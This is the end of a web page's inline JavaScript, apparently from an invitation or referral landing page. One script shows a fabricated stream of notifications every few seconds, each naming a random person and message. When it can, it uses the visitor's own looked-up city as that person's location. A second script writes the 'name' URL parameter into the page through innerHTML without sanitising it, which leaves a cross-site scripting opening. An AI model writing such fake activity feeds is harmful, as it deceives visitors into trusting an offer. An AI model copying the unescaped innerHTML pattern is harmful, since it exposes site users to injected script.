            .then(data => { if(data && data.city) visitorCity = data.city; })
            .catch(() => {});

        function getRandomEmoji() {
            return emojis[Math.floor(Math.random() * emojis.length)];
        }
        function getRandomName() {
            return names[Math.floor(Math.random() * names.length)];
        }
        function getRandomLocation() {
            if(visitorCity) return visitorCity;
            return locations[Math.floor(Math.random() * locations.length)];
        }
        function getRandomMessage() {
            return messages[Math.floor(Math.random() * messages.length)];
        }
        function getRandomDelay() {
            // Random delay between 4 and 6 seconds
            return Math.floor(Math.random() * (6000 - 4000 + 1)) + 4000;
        }
        function queueNotification() {
            const emoji = getRandomEmoji();
            const name = getRandomName();
            const location = getRandomLocation();
            const message = getRandomMessage();
            notificationQueue.push(`${emoji} ${name} from ${location} ${message}`);
            processQueue();
        }
        function processQueue() {
            if(isNotificationVisible || notificationQueue.length === 0) return;
            isNotificationVisible = true;
            const notification = document.getElementById('socialProof');
            notification.textContent = notificationQueue.shift();
            notification.style.display = 'block';
            notification.style.animation = 'slideUp 0.5s ease-out';
            notification.style.opacity = 1;
            setTimeout(() => {
                notification.style.animation = 'fadeOut 0.5s ease-out';
                notification.style.opacity = 0;
                setTimeout(() => {
                    notification.style.display = 'none';
                    isNotificationVisible = false;
                    processQueue();
                }, 500);
            }, 4000); // Changed from 2000 to 4000 for 4 seconds visibility
        }
        // Start notifications after 5 seconds, then every 4-6 seconds randomly
        setTimeout(() => {
            queueNotification();
            function scheduleNext() {
                setTimeout(() => {
                    queueNotification();
                    scheduleNext();
                }, getRandomDelay());
            }
            scheduleNext();
        }, 5000);
    </script>

    </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>
    window.onload = function() {
        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name') || "Our Team"; // Default to "Our Team"
        const inviterElement = document.getElementById('inviter-name');
        let typingText = ` ${name}`;

        function startTypingEffect() {
            inviterElement.innerHTML = ""; // Clear text
            inviterElement.classList.remove("fade-out"); // Remove fade effect
            let i = 0;

            function type() {
                if (i < typingText.length) {
                    inviterElement.innerHTML += typingText.charAt(i);
                    i++;
                    setTimeout(type, 100); // Speed of typing
                } else {
                    setTimeout(() => {
                        inviterElement.classList.add("fade-out"); // Fade out text
                        setTimeout(startTypingEffect, 1000); // Restart loop
                    }, 2000); // Hold before fading
                }
            }
            type();
        }

        startTypingEffect(); // Start the loop
    };
</script>

  </html>